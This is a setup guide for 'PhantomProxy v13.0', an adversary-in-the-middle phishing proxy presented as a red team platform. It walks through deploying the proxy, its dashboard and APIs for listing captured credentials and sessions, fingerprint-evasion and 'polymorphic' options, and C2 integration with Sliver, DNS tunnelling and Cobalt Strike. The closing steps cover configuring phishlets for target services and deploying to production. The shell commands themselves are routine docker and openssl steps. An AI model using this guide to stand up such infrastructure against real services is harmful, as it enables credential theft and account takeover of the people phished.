# 🚀 PHANTOMPROXY v13.0 - COMPLETE SETUP GUIDE

**Enterprise Red Team Simulation Platform**

---

## 📋 CURRENT STATUS (February 2026)

### ✅ WORKING COMPONENTS:
- ✅ **Go Proxy Core** - HTTP/HTTPS AiTM proxy with TLS fingerprinting
- ✅ **Event Bus** - Inter-module communication
- ✅ **C2 Integration** - Sliver, HTTP Callback, DNS Tunnel adapters
- ✅ **SQLite Database** - Session & credential storage
- ✅ **REST API (Go)** - Fiber-based API on port 8080
- ✅ **FastAPI Backend** - Python API service (port 8000)
- ✅ **Next.js Frontend** - Modern dashboard (port 3000)
- ✅ **Docker Compose** - Full enterprise stack
- ✅ **Monitoring** - Prometheus + Grafana + OpenTelemetry

### ⚠️ TEMPORARILY DISABLED (API incompatibility):
- ⚠️ Browser Pool (Playwright) - Requires refactoring for new API
- ⚠️ Domain Rotation (LEGO) - Requires refactoring for v4 API
- ⚠️ Captcha Solver (Playwright) - Requires refactoring for new API

### ❌ NOT YET IMPLEMENTED:
- ❌ AI Layer (LangGraph + RAG)
- ❌ PostgreSQL migration (ready but optional)
- ❌ Full C2 implementations

---

## 🏃 QUICK START

### Option 1: Docker Compose (RECOMMENDED)

**Full Enterprise Stack:**
```bash
# Clone repository
git clone https://github.com/rpauts2/phantom-proxy.git
cd phantom-proxy

# Start all services
docker-compose up --build -d

# Check logs
docker-compose logs -f

# Access services:
# - Frontend: http://localhost:3000
# - Go API: http://localhost:8080
# - Python API: http://localhost:8000
# - Grafana: http://localhost:3001 (admin/admin)
# - Prometheus: http://localhost:9090
```

**Minimal Setup (Proxy only):**
```bash
docker-compose -f docker-compose.minimal.yml up -d
```

### Option 2: Local Go Build

**Prerequisites:**
- Go 1.21+
- Python 3.12+ (for API services)
- Node.js 22+ (for frontend)

**Steps:**
```bash
# Build Go binary
go build -o phantom-proxy.exe ./cmd/phantom-proxy

# Create certificates (self-signed for testing)
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes

# Update config.yaml
# Set your domain and certificate paths

# Run proxy
.\phantom-proxy.exe --config config.yaml --debug
```

### Option 3: Development Mode

**Go Proxy:**
```bash
go run ./cmd/phantom-proxy/main.go --config config.yaml --debug
```

**Python API:**
```bash
cd api
pip install -r requirements.txt
python run.py
```

**Frontend:**
```bash
cd frontend
npm install
npm run dev
```

---

## 📦 DOCKER COMPOSE SERVICES

| Service | Port | Description |
|---------|------|-------------|
| `phantom-proxy` | 443, 8080 | Go proxy core + REST API |
| `postgres` | 5432 | TimescaleDB (optional) |
| `redis` | 6379 | Cache & message broker |
| `prometheus` | 9090 | Metrics collection |
| `grafana` | 3001 | Dashboards |
| `api` | 8000 | FastAPI backend |
| `worker` | - | Celery task queue |
| `frontend` | 3000 | Next.js dashboard |
| `otel-collector` | 4317, 4318 | OpenTelemetry |

---

## 🔧 CONFIGURATION

### config.yaml (Main Configuration)

```yaml
# Network
bind_ip: "0.0.0.0"
https_port: 443
http3_port: 443
http3_enabled: true

# Domain & Certificates
domain: "your-domain.com"
auto_cert: false
cert_path: "./certs/cert.pem"
key_path: "./certs/key.pem"

# Database
database_path: "./phantom.db"
database_type: "sqlite"

# Phishlets
phishlets_path: "./configs/phishlets"

# Security
ja3_enabled: true
ml_detection: false
ml_threshold: 0.75

# Polymorphic Engine
polymorphic_enabled: true
polymorphic_level: "high"

# API
api_enabled: true
api_port: 8080
api_key: "CHANGE-THIS-SECURE-RANDOM-STRING"

# Telegram Notifications
telegram_enabled: false
telegram_token: ""
telegram_chat_id: 0

# Debug
debug: false
log_path: "./logs/phantom.log"
log_level: "info"

# v13 Modules
v13:
  c2:
    sliver:
      enabled: false
      server_url: ""
      operator_token: ""
    http_callback:
      enabled: false
      callback_url: ""
      headers: []
    dns_tunnel:
      enabled: false
      domain: ""
      chunk_size: 60
```

### .env.example (Environment Variables)

```bash
# API Configuration
PHANTOM_API_KEY=your-secret-key
PHANTOM_DOMAIN=your-domain.com

# Frontend
NEXT_PUBLIC_API_URL=http://localhost:8080
NEXT_PUBLIC_API_KEY=your-secret-key

# Database (optional - for Python API)
DATABASE_URL=postgresql+asyncpg://phantom:phantom@postgres:5432/phantom
REDIS_URL=redis://redis:6379/0

# OpenTelemetry
OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4317
```

---

## 🧪 TESTING

### Test Go Proxy
```bash
# Build
go build -o phantom-proxy.exe ./cmd/phantom-proxy

# Run with debug
.\phantom-proxy.exe --config config.yaml --debug

# Check health
curl http://localhost:8080/health
```

### Test Python API
```bash
cd api
pip install -r requirements.txt
python run.py

# Check health
curl http://localhost:8000/health
```

### Test Frontend
```bash
cd frontend
npm install
npm run dev

# Open http://localhost:3000
```

### Test Full Stack
```bash
docker-compose up --build -d

# Check all services
docker-compose ps

# View logs
docker-compose logs -f phantom-proxy
docker-compose logs -f api
docker-compose logs -f frontend
```

---

## 📊 API ENDPOINTS

### Go API (Port 8080)

```
GET  /health                     - Health check
GET  /metrics                    - Prometheus metrics
GET  /api/v1/sessions            - List sessions
GET  /api/v1/sessions/:id        - Get session
DELETE /api/v1/sessions/:id      - Delete session
GET  /api/v1/credentials         - List credentials
GET  /api/v1/credentials/:id     - Get credential
GET  /api/v1/phishlets           - List phishlets
POST /api/v1/phishlets           - Create phishlet
PUT  /api/v1/phishlets/:id       - Update phishlet
DELETE /api/v1/phishlets/:id     - Delete phishlet
POST /api/v1/phishlets/:id/enable  - Enable phishlet
POST /api/v1/phishlets/:id/disable - Disable phishlet
GET  /api/v1/stats               - Get statistics
```

### Python API (Port 8000)

```
GET  /health                     - Health check
GET  /api/v1/sessions            - List sessions
GET  /api/v1/credentials         - List credentials
GET  /api/v1/stats               - Get statistics
```

---

## 🔒 SECURITY

### Generate Secure API Key
```bash
# OpenSSL
openssl rand -hex 32

# Python
python -c "import secrets; print(secrets.token_hex(32))"

# PowerShell
-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 64 | ForEach-Object {[char]$_})
```

### TLS Certificates

**Self-signed (testing):**
```bash
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem \
  -out certs/cert.pem \
  -days 365 -nodes \
  -subj "/CN=your-domain.com"
```

**Let's Encrypt (production):**
```bash
# Use docker-compose with auto_cert: true
# Or manually with certbot
```

---

## 📈 MONITORING

### Prometheus Metrics

Access: `http://localhost:9090`

**Key Metrics:**
- `phantom_requests_total` - Total HTTP requests
- `phantom_sessions_active` - Active sessions
- `phantom_credentials_captured` - Captured credentials
- `phantom_phishlets_enabled` - Enabled phishlets

### Grafana Dashboards

Access: `http://localhost:3001` (admin/admin)

**Pre-configured Dashboards:**
- PhantomProxy Overview
- Request Rates & Latency
- Session Analytics
- Credential Capture Stats

### OpenTelemetry

**Collector Config:** `deploy/otel-collector-config.yaml`

**Exporters:**
- Prometheus (metrics)
- Loki (logs)
- Jaeger (traces)

---

## 🐛 TROUBLESHOOTING

### Go Proxy Won't Start

**Issue:** Certificate errors
```bash
# Check certificate paths in config.yaml
# Ensure certs exist and are readable
ls -la certs/

# Regenerate if needed
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes
```

**Issue:** Port already in use
```bash
# Check what's using port 443
netstat -ano | findstr :443

# Change port in config.yaml
https_port: 8443
```

### Docker Issues

**Issue:** Services won't start
```bash
# Check logs
docker-compose logs

# Rebuild
docker-compose down -v
docker-compose up --build -d
```

**Issue:** Database connection errors
```bash
# Wait for PostgreSQL to be ready
docker-compose logs postgres

# Check health
docker-compose exec postgres pg_isready -U phantom
```

### Frontend Issues

**Issue:** API connection errors
```bash
# Check NEXT_PUBLIC_API_URL in frontend/.env.local
NEXT_PUBLIC_API_URL=http://localhost:8080

# Rebuild frontend
docker-compose restart frontend
```

---

## 📚 DOCUMENTATION

- `README.md` - This file
- `docs/PROJECT_STRUCTURE.md` - Project structure
- `docs/ENTERPRISE_STACK.md` - Enterprise architecture
- `docs/ROADMAP.md` - Development roadmap
- `docs/V13_CHANGELOG.md` - v13 changelog
- `CHANGELOG.md` - Full changelog
- `CONTRIBUTING.md` - Contribution guidelines
- `SECURITY.md` - Security policy

---

## 🎯 NEXT STEPS

1. **Configure your domain:**
   - Update `config.yaml` with your domain
   - Set up DNS records
   - Configure TLS certificates

2. **Set up phishlets:**
   - Configure target services in `configs/phishlets/`
   - Enable required phishlets via API

3. **Configure C2 integration:**
   - Set up Sliver/Empire/Cobalt Strike
   - Update `config.yaml` with C2 credentials
   - Enable C2 modules

4. **Deploy to production:**
   - Use Kubernetes (Helm charts in `helm/`)
   - Configure monitoring
   - Set up alerts

---

## 📞 SUPPORT

**GitHub Issues:** https://github.com/rpauts2/phantom-proxy/issues

**Email:** dev@phantomseclabs.com

**Documentation:** https://github.com/rpauts2/phantom-proxy/tree/main/docs

---

**© 2026 PhantomSec Labs. All rights reserved.**
